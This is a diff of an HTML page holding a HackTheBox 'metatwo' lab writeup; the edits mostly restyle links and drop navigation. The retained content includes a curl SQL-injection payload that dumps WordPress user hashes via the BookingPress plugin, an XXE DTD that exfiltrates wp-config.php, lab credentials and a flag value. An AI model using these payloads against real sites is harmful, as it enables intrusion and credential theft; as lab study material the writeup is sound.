@@ -10,24 +10,14 @@
 <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16'><text y='14' font-size='14'>&#127988;</text></svg>">
 </head>
 <body>
-<button id="menu-toggle" aria-label="Toggle navigation">&#9776;</button>
-<div class="layout">
-<aside class="sidebar" id="sidebar">
-  <a class="brand" href="../../index.html">
-    <span class="brand-flag">&#127988;</span>
-    <span class="brand-text"><strong>the-grizzly-bear</strong><small>Cybersecurity Notes &amp; CTF Writeups</small></span>
-  </a>
-  <nav class="nav" id="nav-root" data-current="htb/completed-machines/metatwo.html" data-root="../.."></nav>
-</aside>
 <main class="content">
   <article class="doc">
   <div class="breadcrumb"><a href="../../index.html">the-grizzly-bear</a> &rsaquo; <a href="../index.html">HackTheBox</a> &rsaquo; <a href="index.html">Completed Machines</a></div>
 <h1 id="title">metatwo</h1>
-
 <p class="figure"><a class="img-link" href="metatwo/untitled.png"><img src="metatwo/untitled.png" alt="Untitled" loading="lazy"></a></p>
 <p class="figure"><a class="img-link" href="metatwo/untitled-1.png"><img src="metatwo/untitled-1.png" alt="Untitled" loading="lazy"></a></p>
 <p class="figure"><a class="img-link" href="metatwo/untitled-2.png"><img src="metatwo/untitled-2.png" alt="Untitled" loading="lazy"></a></p>
-<p><a href="https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357" target="_blank" rel="noopener">https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357</a></p>
+<a class="bookmark" href="https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357" target="_blank" rel="noopener"><div class="bm-text"><div class="bm-title">BookingPress &lt; 1.0.11 - Unauthenticated SQL Injection</div><div class="bm-desc">See details on BookingPress &lt; 1.0.11 - Unauthenticated SQL Injection CVE 2022-0739. View the latest Plugin Vulnerabilities on WPScan.</div><div class="bm-url"><img class="bm-icon" src="../../assets/bookmarks/wpscan-com-vulnerability-388cd42d-b61a-42a4-8604-99b812db235-icon.png" alt="" loading="lazy">https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357</div></div><div class="bm-img"><img src="../../assets/bookmarks/wpscan-com-vulnerability-388cd42d-b61a-42a4-8604-99b812db235.png" alt="" loading="lazy"></div></a>
 <p class="figure"><a class="img-link" href="metatwo/untitled-3.png"><img src="metatwo/untitled-3.png" alt="Untitled" loading="lazy"></a></p>
 <p class="figure"><a class="img-link" href="metatwo/untitled-4.png"><img src="metatwo/untitled-4.png" alt="Untitled" loading="lazy"></a></p>
 <ol><li>curl $baseurl'/wp-admin/admin-ajax.php' --data "action=bookingpress_front_get_category_services&amp;_wpnonce=$nonce&amp;category_id=33&amp;total_service=-7502) UNION ALL SELECT user_login,user_pass,1,1,2,3,4,5,6 FROM wp_users LIMIT 1 OFFSET $i-- -"</li></ol>
@@ -50,8 +40,8 @@ Content-Length: 1040</p>
 <p class="figure"><a class="img-link" href="metatwo/untitled-6.png"><img src="metatwo/untitled-6.png" alt="Untitled" loading="lazy"></a></p>
 <p>manger</p>
 <p>partylikearockstar</p>
-<p><a href="https://wpscan.com/vulnerability/cbbe6c17-b24e-4be4-8937-c78472a138b5" target="_blank" rel="noopener">https://wpscan.com/vulnerability/cbbe6c17-b24e-4be4-8937-c78472a138b5</a></p>
-<p><a href="https://github.com/motikan2010/CVE-2021-29447" target="_blank" rel="noopener">https://github.com/motikan2010/CVE-2021-29447</a></p>
+<a class="bookmark" href="https://wpscan.com/vulnerability/cbbe6c17-b24e-4be4-8937-c78472a138b5" target="_blank" rel="noopener"><div class="bm-text"><div class="bm-title">WordPress 5.6-5.7 - Authenticated XXE Within the Media Library Affecting PHP 8</div><div class="bm-desc">See details on WordPress 5.6-5.7 - Authenticated XXE Within the Media Library Affecting PHP 8 CVE 2021-29447. View the latest Wordpress Vulnerabilities on WPScan.</div><div class="bm-url"><img class="bm-icon" src="../../assets/bookmarks/wpscan-com-vulnerability-cbbe6c17-b24e-4be4-8937-c78472a138b-icon.png" alt="" loading="lazy">https://wpscan.com/vulnerability/cbbe6c17-b24e-4be4-8937-c78472a138b5</div></div><div class="bm-img"><img src="../../assets/bookmarks/wpscan-com-vulnerability-cbbe6c17-b24e-4be4-8937-c78472a138b.png" alt="" loading="lazy"></div></a>
+<a class="bookmark" href="https://github.com/motikan2010/CVE-2021-29447" target="_blank" rel="noopener"><div class="bm-text"><div class="bm-title">GitHub - motikan2010/CVE-2021-29447: WordPress - Authenticated XXE (CVE-2021-29447)</div><div class="bm-desc">WordPress - Authenticated XXE (CVE-2021-29447). Contribute to motikan2010/CVE-2021-29447 development by creating an account on GitHub.</div><div class="bm-url"><img class="bm-icon" src="../../assets/bookmarks/github-com-motikan2010-cve-2021-29447-icon.png" alt="" loading="lazy">https://github.com/motikan2010/CVE-2021-29447</div></div><div class="bm-img"><img src="../../assets/bookmarks/github-com-motikan2010-cve-2021-29447.png" alt="" loading="lazy"></div></a>
 <p><strong>Unicode Hex Character Code &amp;#x25; for %</strong></p>
 <p>$  cat evil.dtd<br>
 &lt;!ENTITY % data SYSTEM "php://filter/zlib.deflate/convert.base64-encode/resource=../wp-config.php"&gt;<br>
@@ -140,14 +130,7 @@ echo "Mailer Error: " . $mail-&gt;ErrorInfo;<br>
 <p class="figure"><a class="img-link" href="metatwo/untitled-22.png"><img src="metatwo/untitled-22.png" alt="Untitled" loading="lazy"></a></p>
 <p>b66bdca9ea5e37bcab6c6049c8a8221e</p>
   </article>
-  <footer class="foot">Built from a Notion export · <a href="https://github.com/the-grizzly-bear">github.com/the-grizzly-bear</a></footer>
+  <footer class="foot"><a href="https://github.com/the-grizzly-bear">github.com/the-grizzly-bear</a></footer>
 </main>
-</div>
-<script src="../../assets/nav.js" defer></script>
-<script>
-document.getElementById('menu-toggle').addEventListener('click',function(){
-  document.getElementById('sidebar').classList.toggle('open');
-});
-</script>
 </body>
 </html>
